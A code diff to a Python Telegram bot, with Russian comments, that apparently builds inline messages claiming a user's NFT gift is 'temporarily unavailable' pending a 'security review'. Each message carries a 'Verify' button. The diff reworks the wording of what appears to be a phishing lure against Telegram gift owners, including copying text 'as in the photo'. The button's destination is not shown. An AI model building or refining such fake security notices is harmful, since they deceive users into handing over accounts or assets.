@@ -61,7 +61,7 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.inline_query.answer(results)
         return
     
-    # Проверяем, что это ссылка на NFT/подарок
+    # Проверяем ссылку
     is_valid_link = re.match(r'^https?://t\.me/(nft|gift|portal)/', query)
     
     if is_valid_link or query.startswith('http'):
@@ -70,10 +70,10 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        # Извлекаем ID подарка из ссылки
+        # Извлекаем ID подарка
         gift_id = query.split('/')[-1] if '/' in query else 'JollyChimp-20203'
         
-        # ⚡ ТЕКСТ КАК НА ФОТО
+        # ⚡ ПРАВИЛЬНЫЙ ТЕКСТ (КОТОРЫЙ ТЫ НАПИСАЛ)
         message = (
             f"❄️ *Gift temporarily unavailable*\n\n"
             f"*{gift_id}* is currently undergoing a security review.\n\n"
@@ -85,8 +85,8 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
         results = [
             InlineQueryResultArticle(
                 id="1",
-                title=f"JollyChimp #20,203",
-                description=f"Отправить сообщение с кнопкой Verify Account",
+                title=f"❄️ {gift_id}",
+                description="Verify your gift",
                 input_message_content=InputTextMessageContent(
                     message_text=message,
                     parse_mode='Markdown',
